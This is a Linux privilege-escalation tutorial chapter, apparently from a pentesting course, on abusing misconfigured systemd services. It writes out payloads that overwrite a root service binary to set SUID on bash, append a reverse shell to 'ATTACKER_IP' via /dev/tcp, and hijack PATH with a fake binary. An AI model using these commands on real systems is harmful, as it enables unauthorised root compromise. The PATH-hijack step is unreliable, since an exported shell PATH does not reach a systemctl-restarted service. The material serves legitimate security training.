# 06. Services and Process Abuse

## Overview

Linux systems rely heavily on **services (daemons)** and **running processes** to provide system and application functionality.

When these services are misconfigured, poorly secured, or executed with elevated privileges, they can become a major privilege escalation vector.

Attackers exploit:

- Misconfigured **systemd services**
- Writable service binaries or scripts
- Weak process permissions
- Insecure environment variables
- Improper service restart mechanisms

---

## 1. Linux Services Fundamentals

Most modern Linux distributions use **systemd** to manage services.

### Check running services:

```bash
systemctl list-units --type=service
```

### Check service status:

```bash
systemctl status <service_name>
```

### View service configuration:

```bash
cat /etc/systemd/system/<service_name>.service
```

or 

```bash
cat /lib/systemd/system/<service_name>.service
```

### Example service file:

```bash
[Unit]
Description=Backup Service

[Service]
ExecStart=/opt/backup.sh
User=root

[Install]
WantedBy=multi-user.target
```

➡ If ``ExecStart`` points to a writable script → critical risk.

---

## 2. Key Enumeration Targets

During privilege escalation, focus on:

- ``/etc/systemd/system/``
- ``/lib/systemd/system/``
- ``/usr/lib/systemd/system/``
- ``systemctl status <service>``
- Running processes via ``ps aux``
- Cron-triggered services or timers
- ``/etc/init.d/`` (legacy systems)

---

## 3. Writable Service Binary Abuse

### Scenario

A root service runs:

```bash
ExecStart=/opt/service/worker
```

Check permissions:

```bash
ls -l /opt/service/worker
```

If writable:

```bash
-rwxrwxrwx 1 root root 12345 Jun 6 /opt/service/worker
```

➡ Critical misconfiguration

### Exploitation

Inject payload:

```bash
echo '#!/bin/bash' > /opt/service/worker
echo 'chmod +s /bin/bash' >> /opt/service/worker
chmod +x /opt/service/worker
```

or reverse shell:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/service/worker
```

Then restart service:

```bash
systemctl restart <service_name>
```

➡ Root-level execution achieved

---

## 4. PATH Hijacking in Services

Services often run with a restricted or predictable PATH.

### Example:

```bash
ExecStart=/opt/scripts/cleanup.sh
```

### Inside script:

```bash
cp file1 file2
rm file1
```

If no full binary paths are used → hijack possible

### Exploitation Steps

#### Step 1: Create malicious binary

```bash
mkdir /tmp/evil
echo "/bin/bash" > /tmp/evil/cp
chmod +x /tmp/evil/cp
```

#### Step 2: Modify PATH

```bash
export PATH=/tmp/evil:$PATH
```

#### Step 3: Trigger service restart

```bash
systemctl restart <service_name>
```

➡ root-level execution via fake binary

---

## 5. Process Injection Opportunities

Some services spawn child processes insecurely.

### Example:

```text
service → calls python script → executes system() calls
```

If Python script uses:

```python
os.system("tar -cf backup *")
```

➡ wildcard injection or command injection possible.

---

## 6. Real-World Privilege Escalation Chains

### Chain 1: Writable systemd service script

1. Identify root service
2. Find writable ExecStart script
3. Inject payload
4. Restart service
5. Root shell obtained

### Chain 2: PATH hijacking via service

1. Detect service using unqualified binaries
2. Create fake binary in writable directory
3. Modify PATH
4. Restart service
5. Root compromise

### Chain 3: Process spawn abuse

1. Identify service spawning scripts
2. Find unsafe system calls
3. Inject command execution payload
4. Wait for trigger
5. Privilege escalation achieved

---

## Key Mindset

When analyzing services and processes, always ask:

* What runs automatically as root?
* Is the service binary or script writable?
* Does it rely on unsafe environment variables?
* Are full paths used in commands?
* Can I hijack execution flow or dependencies?